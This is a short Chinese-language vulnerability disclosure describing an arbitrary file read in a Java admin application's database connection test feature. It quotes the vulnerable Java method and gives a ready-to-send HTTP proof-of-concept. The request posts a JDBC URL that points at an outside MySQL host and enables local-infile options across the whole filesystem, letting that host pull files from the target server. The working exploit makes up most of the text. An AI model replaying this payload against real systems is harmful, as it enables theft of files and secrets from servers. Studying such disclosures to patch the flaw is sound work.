# jdbc任意文件读取

漏洞代码

me.zhengjie.modules.maint.util.SqlUtils

未关闭allowLoadLocalInfile属性，导致任意文件读取

```java
	public static boolean testConnection(String jdbcUrl, String userName, String password) {
		Connection connection = null;
		try {
			connection = getConnection(jdbcUrl, userName, password);
			if (null != connection) {
				return true;
			}
		} catch (Exception e) {
            log.error("Get connection failed:{}", e.getMessage());
		} finally {
			releaseConnection(connection);
		}
		return false;
	}
```

POC

```http
POST /api/database/testConnect HTTP/1.1
Host: 192.168.239.1:8013
Content-Length: 231
Authorization: Bearer eyJhbGciOiJIUzUxMiJ9.eyJ1aWQiOiI0ZjdlY2ZmMWNjMzQ0NTFiOGIzNzYxMzhlZWQ4ZTNiYiIsInVzZXJJZCI6MSwic3ViIjoiYWRtaW4ifQ.7aUt_BQjEARMrQYGRPcRTXoVodhNaZB01rA2gqbGmG1dPOcRNyh7PNsh_H32_42JsXluqZjrfWqrnbO5AVBtkA
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36
Accept: application/json, text/plain, */*
Content-Type: application/json
Origin: http://192.168.239.1:8013
Referer: http://192.168.239.1:8013/mnt/maint/database
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Connection: keep-alive

{"id":null,"name":"test","jdbcUrl":"jdbc:mysql://101.245.103.200:8081/test?allowLoadLocalInfile=true&allowUrlInLocalInfile=true&allowLoadLocalInfileInPath=/&maxAllowedPacket=655360&user=f0e3115","userName":"f0e3115","pwd":"123456"}
```

